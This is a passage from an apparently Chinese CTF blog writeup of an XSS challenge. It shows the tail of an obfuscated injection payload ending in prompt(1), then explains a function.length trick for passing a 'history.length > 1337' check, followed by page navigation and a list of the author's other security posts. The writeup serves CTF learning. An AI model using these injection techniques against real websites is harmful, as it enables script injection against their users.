,g,C,o,n,t,e,n,t,h,e,r,e,c,o,n,t,e,n,t,h,e,r,e,m,a,k,i,n,g,i,t,l,o,o,k,l,i,k,e,r,e,a,d,a,b,l,e,E,n,g,l,i,s,h,M,a,n,y,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,p,a,c,k,a,g,e,s,a,n,d,w,e,b,p,a,g,e,e,d,i,t,o,r,s,n,o,w,u,s,e,L,o,r,e,m,I,p,s,u,m,a,s,t,h,e,i,r,d,e,f,a,u,l,t,m,o,d,e,l,t,e,x,t,a,n,d,a,s,e,a,r,c,h,f,o,r,l,o,r,e,m,i,p,s,u,m,w,i,l,l,u,n,c,o,v,e,r,m,a,n,y,w,e,b,s,i,t,e,s,s,t,i,l,l,i,n,t,h,e,i,r,i,n,f,a,n,c,y,V,a,r,i,o,u,s,v,e,r,s,i,o,n,s,h,a,v,e,e,v,o,l,v,e,d,o,v,e,r,t,h,e,y,e,a,r,s,s,o,m,e,t,i,m,e,s,b,y,a,c,c,i,d,e,n,t,s,o,m,e,t,i,m,e,s,o,n,p,u,r,p,o,s,e,i,n,j,e,c,t,e,d,h,u,m,o,u,r,a,n,d,t,h,e,l,i,k,e,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>,<span class="symbol">_</span>)$&amp;<span class="built_in">prompt</span>(<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<p>这里用到的是一个特殊的技巧，测试下面的代码：<br/><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> <span class="title">functionDeclaration</span>(a,b,c) {</div><div class="line">    alert('<span class="keyword">Function</span> <span class="title">declared</span> <span class="keyword">with</span> ' + functionDeclaration.length + ' parameters');</div><div class="line">}</div><div class="line"> </div><div class="line"> </div><div class="line">functionDeclaration();</div></pre></td></tr></table></figure></p>
<p>返回：<br/><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert &gt; <span class="keyword">Function</span> <span class="title">declared</span> <span class="keyword">with</span> <span class="number">3</span> parameters</div></pre></td></tr></table></figure></p>
<p>所以构造这样的代码：<br/><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (history.<span class="built_in">length</span> &gt; <span class="number">1337</span>) {                                 </div><div class="line">   <span class="comment">// you can inject any code here</span></div><div class="line">   <span class="comment">// as long as it will be executed</span></div><div class="line">   <span class="function"><span class="keyword">function</span> <span class="title">history</span><span class="params">(l,o,r,e,m...1338 times...)</span>{{<span class="title">injection</span>}}</span></div><div class="line">   prompt(<span class="number">1</span>)</div><div class="line">}</div></pre></td></tr></table></figure></p>
</div>
</div>
<div class="copyright">
<p><span>本文标题:</span><a href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></p>
<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
<p><span>发布时间:</span>2015-07-02, 13:48:17</p>
<p><span>最后更新:</span>2015-11-10, 13:14:30</p>
<p>
<span>原始链接:</span><a class="post-url" href="/2015/07/02/xss-p/" title="xss无声挑战赛_writeup">http://lorexxar.cn/2015/07/02/xss-p/</a>
<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2015/07/02/xss-p/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
<script> var clipboard = new Clipboard('.copy-path'); </script>
</p>
<p>
<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
</div>
<nav id="article-nav">
<div class="article-nav-title" id="article-nav-newer">
<a href="/2015/09/28/nsctf-writeup/">
                    Nsctf2015_Writeup
                </a>
</div>
<div class="article-nav-title" id="article-nav-older">
<a href="/2015/06/11/ctf0611/">
                    ctf近期总结
                </a>
</div>
</nav>
</article>
<div class="toc-article" id="toc">
<strong class="toc-title">文章目录</strong>
<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#规则"><span class="toc-number">1.</span> <span class="toc-text">规则</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#writeup"><span class="toc-number">2.</span> <span class="toc-text">writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-0"><span class="toc-number">2.1.</span> <span class="toc-text">level 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-number">2.2.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">2.3.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">2.4.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">2.5.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5"><span class="toc-number">2.6.</span> <span class="toc-text">level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level6"><span class="toc-number">2.7.</span> <span class="toc-text">level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level7"><span class="toc-number">2.8.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level8"><span class="toc-number">2.9.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level9"><span class="toc-number">2.10.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level10"><span class="toc-number">2.11.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level11"><span class="toc-number">2.12.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level12"><span class="toc-number">2.13.</span> <span class="toc-text">level12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level13"><span class="toc-number">2.14.</span> <span class="toc-text">level13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level14"><span class="toc-number">2.15.</span> <span class="toc-text">level14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level15"><span class="toc-number">2.16.</span> <span class="toc-text">level15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">2.17.</span> <span class="toc-text">level-1</span></a></li></ol></li></ol>
</div>
<style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>
<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
<script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>
<div class="share">
<div class="bdsharebuttonbox">
<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div></div></div></div></body></html>

<script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"xss无声挑战赛_writeup　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>

<section class="youyan" id="comments">
<script>
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
            (d.head || d.body).appendChild(s);
        }
    </script>
<script> loadComment(); </script>
<div id="uyan_frame"></div>
</section>
<div class="scroll" id="post-nav-button">
<a href="/2015/09/28/nsctf-writeup/" title="上一篇: Nsctf2015_Writeup">
<i class="fa fa-angle-left"></i>
</a>
<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
<a href="/2015/06/11/ctf0611/" title="下一篇: ctf近期总结">
<i class="fa fa-angle-right"></i>
</a>
</div>
<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" 